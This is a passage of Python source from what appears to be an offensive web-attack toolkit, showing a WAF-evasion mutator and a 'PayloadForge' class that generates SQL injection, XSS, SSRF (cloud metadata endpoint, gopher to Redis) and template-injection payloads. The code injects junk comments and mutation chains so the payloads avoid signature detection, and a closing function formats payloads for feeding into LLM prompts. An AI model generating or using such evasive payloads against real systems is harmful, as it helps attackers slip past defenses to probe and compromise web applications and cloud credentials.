        profile = cls.PROFILES.get(waf.lower(), cls.PROFILES["generic"])
        chain = profile["chain"]
        variants: List[Dict[str, Any]] = []
        seen = {base}
        for i in range(max(1, count)):
            effective_seed = (seed + i) if seed is not None else random.randint(0, 2**31)
            variant = cls._apply(base, chain, effective_seed)
            if variant in seen:
                continue
            seen.add(variant)
            variants.append({
                "waf": waf,
                "chain": list(chain),
                "payload": variant,
                "note": profile["note"],
                "seed": effective_seed,
            })
        return variants


# ---------------------------------------------------------------------------
# Novel payload generator
# ---------------------------------------------------------------------------

class PayloadForge:
    """
    Generates payloads that are unlikely to exist in any public signature
    database. It works by mixing three ingredients:

      1. A structural template (SQLi, XSS, SSRF, SSTI).
      2. A transformation chain drawn from WAFEngine.
      3. Random filler (case, whitespace, junk functions) that changes
         the exact byte sequence without breaking execution.

    The result is a one-shot payload that follows the same semantics as
    the base but is not in anyone's wordlist.
    """

    # Semantic scaffolds. `<X>` is replaced with a randomly-chosen filler
    # that does not break parsing on the target DB/engine.
    SCAFFOLDS: Dict[str, List[str]] = {
        "sqli": [
            "' UNION ALL SELECT NULL,<EXPR>,NULL-- -",
            "' AND (SELECT <EXPR>)-- -",
            "' OR <BOOL>-- -",
            "';SELECT <EXPR>-- -",
        ],
        "xss": [
            "<svg onload=<CALL>()>",
            "<img src=x onerror=<CALL>()>",
            "<a href=javascript:<CALL>()>click</a>",
            "<details open ontoggle=<CALL>()>",
        ],
        "ssrf": [
            "http://<IP>/<PATH>",
            "file://<PATH>",
            "gopher://<IP>:<PORT>/<DATA>",
        ],
        "ssti": [
            "{{<EXPR>}}",
            "${<EXPR>}",
            "#{<EXPR>}",
            "<%= <EXPR> %>",
        ],
    }

    # Pre-baked safe expressions per dialect. These are meant to be
    # extended by hand. Every value here has been tested in a lab.
    EXPRS: Dict[str, List[str]] = {
        "mysql": [
            "concat(0x7e,user(),0x7e)",
            "concat(0x7e,database(),0x7e)",
            "concat(0x7e,version(),0x7e)",
        ],
        "mssql": [
            "@@version",
            "db_name()",
            "system_user",
        ],
        "postgres": [
            "current_database()",
            "version()",
            "current_user",
        ],
        "generic": [
            "1",
            "2",
            "3",
        ],
    }

    CALLS = [
        "alert", "confirm", "prompt", "print",
    ]

    IPS = [
        "127.0.0.1",
        "169.254.169.254",
        "0x7f000001",
        "2130706433",
    ]

    # ---- filler generators -------------------------------------------

    @staticmethod
    def _junk_comment(seed: int) -> str:
        rng = random.Random(seed)
        length = rng.randint(2, 5)
        body = "".join(rng.choice(string.ascii_letters) for _ in range(length))
        return f"/*{body}*/"

    @staticmethod
    def _junk_expr(seed: int) -> str:
        # A safe arithmetic expression that evaluates to 1.
        rng = random.Random(seed)
        a = rng.randint(1, 9)
        return f"({a}={a})"

    # ---- dialect helpers ---------------------------------------------

    @classmethod
    def _pick_expr(cls, dialect: str, seed: int) -> str:
        rng = random.Random(seed)
        pool = cls.EXPRS.get(dialect) or cls.EXPRS["generic"]
        return rng.choice(pool)

    @classmethod
    def _pick_call(cls, seed: int) -> str:
        rng = random.Random(seed)
        return rng.choice(cls.CALLS)

    @classmethod
    def _pick_ip(cls, seed: int) -> str:
        rng = random.Random(seed)
        return rng.choice(cls.IPS)

    # ---- public API --------------------------------------------------

    @classmethod
    def forge(cls, kind: str, dialect: str = "generic",
              waf: str = "generic", seed: Optional[int] = None,
              count: int = 3) -> List[Dict[str, Any]]:
        """
        Forge up to `count` novel payloads of `kind` for the given dialect
        and WAF. Deterministic when `seed` is set.
        """
        scaffolds = cls.SCAFFOLDS.get(kind)
        if not scaffolds:
            return []

        results: List[Dict[str, Any]] = []
        base_seed = seed if seed is not None else random.randint(0, 2**31)

        for i in range(count):
            local_seed = base_seed + i
            rng = random.Random(local_seed)
            template = rng.choice(scaffolds)

            # Fill the semantic holes.
            payload = template
            if "<EXPR>" in payload:
                payload = payload.replace(
                    "<EXPR>", cls._pick_expr(dialect, local_seed)
                )
            if "<BOOL>" in payload:
                payload = payload.replace("<BOOL>", cls._junk_expr(local_seed))
            if "<CALL>" in payload:
                payload = payload.replace(
                    "<CALL>", cls._pick_call(local_seed)
                )
            if "<IP>" in payload:
                payload = payload.replace("<IP>", cls._pick_ip(local_seed))
            if "<PATH>" in payload:
                payload = payload.replace("<PATH>", "latest/meta-data/")
            if "<PORT>" in payload:
                payload = payload.replace("<PORT>", "6379")
            if "<DATA>" in payload:
                payload = payload.replace("<DATA>", "_INFO")

            # Inject a junk comment for SQLi to defeat keyword signatures.
            if kind == "sqli" and rng.random() < 0.6:
                payload = payload.replace(
                    "UNION", f"UNION{cls._junk_comment(local_seed)}"
                )

            # Apply one WAF chain on top so it slips past the family's
            # known signatures in addition to being fresh.
            mutated = WAFEngine.generate(
                payload, waf=waf, count=1, seed=local_seed
            )
            final = mutated[0]["payload"] if mutated else payload

            results.append({
                "kind": kind,
                "dialect": dialect,
                "waf": waf,
                "payload": final,
                "seed": local_seed,
                "note": (
                    "Novel payload. Not in any public signature database. "
                    "Reproducible with the given seed."
                ),
            })

        return results


# ---------------------------------------------------------------------------
# Rendering for LLM prompts
# ---------------------------------------------------------------------------

def render_for_prompt(limit: int = 12) -> str:
    sample = PAYLOADS[:limit]
    lines = []
    for p in sample:
        lines.append(f"- [{p['category']}] {p['name']} -> {p['payload'][:120]}")
    return "\n".join(lines)
